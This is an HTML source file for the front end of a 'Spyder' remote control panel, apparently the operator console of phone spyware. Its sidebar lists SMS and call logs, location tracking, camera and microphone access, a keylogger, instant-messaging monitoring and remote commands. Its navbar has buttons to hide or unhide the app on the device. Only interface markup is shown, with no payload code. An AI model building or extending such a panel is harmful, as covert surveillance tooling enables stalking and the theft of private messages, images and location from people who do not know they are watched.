<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Spyder Panel</title>

 <!-- Fonts & Icons -->
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />

  <!-- Bootstrap -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>

  <!-- Leaflet (Map) -->
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

  <!-- Custom CSS -->
  <link rel="stylesheet" href="board.css">
  <link rel="stylesheet" href="dashboard.css">
  <!-- <link rel="stylesheet" href="sms.css"> -->
</head>

<body>
  <!-- <div class="matrix"></div> -->
  <div class="wrapper">
    <main class="combine">

      <!-- Sidebar -->
      <div class="sidebar" id="sidebar">
       <div class="sidebarTopcover" >
         <div class="sidebar-top">
          <h3 class=" text-info  fw-bold  side-head">Spyder </h3>
          <i class="fas fa-bars side-menu" id="hideBtn" style="cursor: pointer;"></i>
        </div>
       </div>
 
  <div class="side-features">
  <a href="javascript:void(0)" onclick="dashboard('dashboard')" class="menu-link active"><i class="fas fa-home"></i> Dashboard</a>
  
  <a href="javascript:void(0)" onclick="dashboard('sms')" class="menu-link"><i class="fas fa-sms"></i> SMS Logs</a>
  <a href="javascript:void(0)" onclick="dashboard('call-logs')" class="menu-link"><i class="fas fa-phone-alt"></i> Call Logs</a>
  <a href="javascript:void(0)" onclick="dashboard('location')" class="menu-link"><i class="fas fa-map-marker-alt"></i> Location</a>
  <a href="javascript:void(0)" onclick="dashboard('contact')" class="menu-link"><i class="fas fa-battery-half"></i>Contact Logs</a>
  <a href="javascript:void(0)" onclick="dashboard('camera')" class="menu-link"><i class="fas fa-camera"></i> Camera</a>
  <a href="javascript:void(0)" onclick="dashboard('microphone')" class="menu-link"><i class="fas fa-microphone"></i> Microphone</a>
  <a href="javascript:void(0)" onclick="dashboard('gallery')" class="menu-link"><i class="fas fa-images"></i> Gallery</a>
  <a href="javascript:void(0)" onclick="dashboard('file-manager')" class="menu-link"><i class="fas fa-folder-open"></i> File Manager</a>
  <a href="javascript:void(0)" onclick="dashboard('im-monitor')" class="menu-link"><i class="fas fa-comment-dots"></i> Instant Messaging</a>
  <a href="javascript:void(0)" onclick="dashboard('geo-fence')" class="menu-link"><i class="fas fa-draw-polygon"></i> Geo-Fencing</a>
  <a href="javascript:void(0)" onclick="dashboard('keylogger')" class="menu-link"><i class="fas fa-keyboard"></i> Keylogger</a>
  <a href="javascript:void(0)" onclick="dashboard('remote-command')" class="menu-link"><i class="fas fa-paste"></i> Remote Commands</a>
  <a href="javascript:void(0)" onclick="dashboard('installed-app')" class="menu-link"><i class="fas fa-lock"></i> Apps</a>
  <a href="javascript:void(0)" onclick="logout()" class="menu-link"><i class="fas fa-sign-out-alt"></i> Logout</a>
</div>

      </div>

      <!-- Main Content -->
      <div class="main-section" id="mainSection">
        <div class="navbar">
          <div class="nav-left">
            <span class="open-sidebar-btn" class="showBtnClass" id="showBtn"><i class="fas fa-bars"></i></span>
            <h4 class="navHeading  text-info fw-bold">Spyder Web </h4>
          </div>
          <button id="hideToggle">Hide App</button>
          <button id="unhideToggle">Unhide App</button>
          <button id="getLocationBtn">Get Location</button>
          <button id="getSmsBtn">Get Sms</button>


          <button id="refreshSiteBtn"><i class="fa-solid fa-arrows-rotate"></i></button>
          <button class="logOut" onclick="logout()">Logout</button>
        </div>

        <!-- Added for more -->
        <div class="asdf" >

        </div>
         <!-- Dynamic content loads here -->
        <div class="main-content">
         
          
        </div>
      </div>
    </main>
  </div>

  <div class="footer">&copy; 2025 =>> Spyder Remote Control Panel</div>
